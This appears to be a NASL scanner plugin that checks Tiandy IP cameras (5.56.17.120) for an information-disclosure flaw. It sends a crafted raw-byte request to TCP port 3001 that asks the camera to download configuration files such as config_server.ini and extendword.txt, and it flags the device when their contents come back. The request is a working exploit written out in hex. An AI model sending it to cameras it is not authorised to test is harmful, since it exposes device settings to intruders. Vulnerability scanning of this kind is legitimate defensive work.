#############################################################################
#  yangxu
############################################################################
include("compat.inc");
if(description)
{
 script_id(51799345);
 script_category(ACT_ATTACK);
 script_family("Camera");
 script_version("$Revision: 13 $");
 script_set_attribute(attribute:"last_modification", value:"$Date: 2016-02-22 11:23:30 +0000 (Mon, 22 Feb 2016) $");
 script_set_attribute(attribute:"creation_date", value:"2016-04-05 22:37:48 +0000 (Tue, 05 Apr 2016)");
 script_name(english:"Tiandy IP Cameras 5.56.17.120 - Sensitive Information Disclosure");
 script_set_attribute(attribute:"description", value:"Tiandy IP cameras 5.56.17.120 do not properly restrict a certain proprietary protocol, which allows remote attackers to read settings via a crafted request to TCP port 3001, as demonstrated by config* files and extendword.txt.");
 script_summary("Tiandy IP Cameras 5.56.17.120 - Sensitive Information Disclosure");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:S/C:N/I:N/A:P");
 script_set_attribute(attribute:"risk_factor", value:"Medium");
 script_set_attribute(attribute : "solution" , value : "Update System");
 script_copyright(english:"This script is Copyright (C) 2017 WebRAY, Inc.");
 script_dependencies("find_service2.nasl","find_service1.nasl");
 script_require_ports("3001");
 exit(0);
}

port = 3001;
if(!get_port_state(port)) exit(0);
ip = get_host_ip();
if(get_port_state(port))
{
	peer0_0 = raw_string(0x74,0x1f,0x4a,0x84,0xc8,0xa8,0xe4,0xb3,0x18,0x7f,0xd2,0x21,0x08,0x00,0x45,0x00,0x00,0xcc,0x3e,0x9a,0x40,0x00,0x40,0x06,0xd4,0x13,0xac,0x10,0x65,0x75,0x6e,0x31,0xa7,0xc7,0x43,0x5b,0x0b,0xb9,0x85,0xbc,0x1d,0xf0,0x5b,0x3e,0xe8,0x32,0x50,0x18,0x7f,0xa4,0xc6,0xcf,0x00,0x00,0xf1,0xf5,0xea,0xf5,0x74,0x00,0xa4,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x90,0x00);
	peer0_1 = hex2raw(s:hexstr(ip));
	peer0_2 = raw_string(0x09,0x50,0x52,0x4f,0x58,0x59,0x09,0x43,0x4d,0x44,0x09,0x44,0x48,0x09,0x43,0x46,0x47,0x46,0x49,0x4c,0x45,0x09,0x44,0x4f,0x57,0x4e,0x4c,0x4f,0x41,0x44,0x09,0x36,0x09,0x63,0x6f,0x6e,0x66,0x69,0x67,0x5f,0x73,0x65,0x72,0x76,0x65,0x72,0x2e,0x69,0x6e,0x69,0x09,0x65,0x78,0x74,0x65,0x6e,0x64,0x77,0x6f,0x72,0x64,0x2e,0x74,0x78,0x74,0x09,0x63,0x6f,0x6e,0x66,0x69,0x67,0x5f,0x70,0x74,0x7a,0x2e,0x64,0x61,0x74,0x09,0x63,0x6f,0x6e,0x66,0x69,0x67,0x5f,0x72,0x69,0x67,0x68,0x74,0x2e,0x64,0x61,0x74,0x09,0x63,0x6f,0x6e,0x66,0x69,0x67,0x5f,0x64,0x67,0x2e,0x64,0x61,0x74,0x09,0x63,0x6f,0x6e,0x66,0x69,0x67,0x5f,0x62,0x75,0x72,0x6e,0x2e,0x64,0x61,0x74,0x0a,0x0a,0x0a);


	soc = open_sock_tcp(port);
	if(!soc){
	 exit(0);
	}
	peer = peer0_0+peer0_1+peer0_2;
	send(socket:soc, data:peer);
	buf = recv(socket:soc, length:4096*2);
	if("../config/dvr/config_server.ini"><buf && "../config/dvr/extendword.txt" >< buf && "[mediadevice]" >< buf && "[commoninfo]" >< buf)
	{
        security_hole(port:port,data:buf);
	}
	close(soc);
	exit(0);
}
exit(0);
